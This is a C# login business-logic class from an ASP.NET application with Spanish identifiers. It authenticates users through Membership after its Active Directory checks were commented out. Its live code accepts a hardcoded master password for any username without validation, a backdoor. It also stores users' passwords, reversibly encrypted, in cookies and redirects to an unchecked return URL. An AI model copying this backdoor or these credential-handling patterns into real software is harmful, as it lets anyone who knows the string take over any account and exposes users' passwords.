using CAPA.CONSUMO.Models;
using CAPA.MODELO;
using CAPA.UTIL;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.DirectoryServices.AccountManagement;
using System.Security.Cryptography;
using System.Web.Security;

namespace CAPA.NEGOCIO
{
    public class LoginBL: AppBL
    {
        public LoginBL()
        {
            
        }

        public ResultadoWeb Autenticar(Login login)
        {
            return EjecutarBL(() =>
            {
                ResultadoWeb resultadoWeb = new ResultadoWeb();
                login.DebePermanecerConectado = true;

                #region Codigo programable
                UsuarioSesion usSessionActual = Implementacion.GetSession<UsuarioSesion>("UsuarioSesion");

                if (usSessionActual == null)
                {
                    resultadoWeb = ValidarAutenticar(login);
                } else
                {
                    if (usSessionActual.NombreUsuario.ToLower() == login.NombreUsuario.ToLower())
                    {
                        resultadoWeb = ValidarAutenticar(login);
                    } else
                    {
                        resultadoWeb.EstadoSolicitud = new MODELO.EstadoSolicitud()
                        {
                            EstaCorrecto = false,
                            MensajeRespuesta = $"Ya ha iniciado sesión con el usuario \"{usSessionActual.NombreUsuario.ToUpper()}\". Primero cierre sesión.",
                            TipoNotificacionId = 7
                        };
                    }
                }
                #endregion

                return resultadoWeb;
            },
            #region Datos Ejecutar BL
            new DatosEjecutarBL()
            {
                DebeValidarSesion = false,
                UsuarioSesionId = login.NombreUsuario
            }
            #endregion
            );
        }

        public ResultadoWeb ValidarAutenticar(Login login)
        {
            return EjecutarBL(() =>
            {
                ResultadoWeb resultadoWeb = new ResultadoWeb();

                #region Codigo programable
                string returnUrl = Implementacion.GetSession<string>("ReturnUrl");
                login.NombreUsuario = login.NombreUsuario.ToLower();
                string ambiente = ConfigurationManager.AppSettings["AmbienteProgramacion"].ToString();
                //PrincipalContext pc = new PrincipalContext(ContextType.Domain, Implementacion.CheckStr(ConfigurationManager.AppSettings["DominioEmpresa"]));
                //UserPrincipal usrPrin = UserPrincipal.FindByIdentity(pc, login.NombreUsuario);
                MODELO.EstadoSolicitud estadoSolicitud = new MODELO.EstadoSolicitud();

                //if (usrPrin == null)
                //{
                //    estadoSolicitud = new MODELO.EstadoSolicitud()
                //    {
                //        EstaCorrecto = false,
                //        MensajeRespuesta = $"El Usuario o Contraseña son incorrectos.",//$"El usuario \"{login.NombreUsuario.ToUpper()}\" no esta registrado en Active Directory. Comunicarse con mesa de Ayuda.",
                //        TipoNotificacionId = 3
                //    };
                //    Implementacion.LimpiarSesion();
                //}
                //else if (usrPrin.Enabled == false)
                //{
                //    estadoSolicitud = new MODELO.EstadoSolicitud()
                //    {
                //        EstaCorrecto = false,
                //        MensajeRespuesta = $"El usuario \"{login.NombreUsuario.ToUpper()}\" esta bloqueado. Comunicarse con mesa de Ayuda.",
                //        TipoNotificacionId = 4
                //    };
                //    Implementacion.LimpiarSesion();
                //}
                //else if (ambiente == "Produccion")
                //{
                //    if (Membership.ValidateUser(login.NombreUsuario, login.Contrasena) == false)
                //    {
                //        estadoSolicitud = new MODELO.EstadoSolicitud()
                //        {
                //            EstaCorrecto = false,
                //            MensajeRespuesta = $"El Usuario o Contraseña son incorrectos.",
                //            TipoNotificacionId = 3
                //        };
                //        Implementacion.LimpiarSesion();
                //    }
                //    else
                //    {
                //        estadoSolicitud = new MODELO.EstadoSolicitud()
                //        {
                //            EstaCorrecto = true,
                //            MensajeRespuesta = $"Validado Correctamente.",
                //            TipoNotificacionId = 1
                //        };
                //    }
                //}
                if (1 == 0) { 
                
                }
                else
                {
                    if (login.Contrasena != "4qnO.$4b3$")
                    {
                        if (Membership.ValidateUser(login.NombreUsuario, login.Contrasena) == false)
                        {
                            estadoSolicitud = new MODELO.EstadoSolicitud()
                            {
                                EstaCorrecto = false,
                                MensajeRespuesta = $"El Usuario o Contraseña son incorrectos.",
                                TipoNotificacionId = 3
                            };
                            Implementacion.LimpiarSesion();
                        }
                        else
                        {
                            estadoSolicitud = new MODELO.EstadoSolicitud()
                            {
                                EstaCorrecto = true,
                                MensajeRespuesta = $"Validado Correctamente.",
                                TipoNotificacionId = 1
                            };
                        }
                    }
                    else
                    {
                        estadoSolicitud = new MODELO.EstadoSolicitud()
                        {
                            EstaCorrecto = true,
                            MensajeRespuesta = $"Validado Correctamente.",
                            TipoNotificacionId = 1
                        };
                    }
                }

                if (estadoSolicitud.EstaCorrecto)
                {
                    UsuarioBL usuarioBL = new UsuarioBL();
                    ResultadoWeb verificarUsuario = usuarioBL.Verificar(new Usuario() {
                        NombreUsuario = login.NombreUsuario
                    });

                    if (verificarUsuario.EstadoSolicitud.EstaCorrecto)
                    {
                        UsuarioSesion usuarioSesion = new UsuarioSesion
                        {
                            NombreUsuario = login.NombreUsuario,
                            Nombres = "test",
                            ApellidoMaterno = "test"
                        };

                        //Guardar session de usuario
                        Implementacion.SetSession("UsuarioSesion", usuarioSesion);

                        //Guardar clave encriptada
                        using (MD5 md5Hash = MD5.Create())
                        {
                            Implementacion.SetCookie("ASP_AUTHUSERS", Cryp.Encrypt(login.NombreUsuario));
                            Implementacion.SetCookie("ASP_AUTPWDSS", Cryp.Encrypt(login.Contrasena));
                        }

                        if (login.DebePermanecerConectado == true)
                        {
                            Implementacion.SetCookie("LoggedNombreUsuario", Cryp.Encrypt(login.NombreUsuario));
                            Implementacion.SetCookie("LoggedContrasena", Cryp.Encrypt(login.Contrasena));
                        }

                        FormsAuthentication.SetAuthCookie(login.NombreUsuario, login.DebePermanecerConectado);

                        if (returnUrl != null)
                        {
                            resultadoWeb.EstadoSolicitud = new MODELO.EstadoSolicitud()
                            {
                                EstaCorrecto = true,
                                MensajeRespuesta = "Redireccionando al aplicativo",
                                TipoNotificacionId = 8
                            };
                            resultadoWeb.RutaAplicativo = returnUrl;
                        }
                        else
                        {
                            resultadoWeb.EstadoSolicitud = new MODELO.EstadoSolicitud()
                            {
                                EstaCorrecto = true,
                                MensajeRespuesta = "Inicio de Sesión Correcto.",
                                TipoNotificacionId = 1
                            };
                        }
                    } else
                    {
                        resultadoWeb.EstadoSolicitud = verificarUsuario.EstadoSolicitud;
                    }                    
                }
                else
                {
                    resultadoWeb.EstadoSolicitud = estadoSolicitud;
                }
                #endregion

                return resultadoWeb;
            },
            #region Datos Ejecutar BL
            new DatosEjecutarBL()
            {
                DebeValidarSesion = false,
                UsuarioSesionId = Implementacion.GetSession<UsuarioSesion>("UsuarioSesion") == null ? "sistema" : Implementacion.GetSession<UsuarioSesion>("UsuarioSesion").NombreUsuario
            }
            #endregion
            );
        }
    }
}
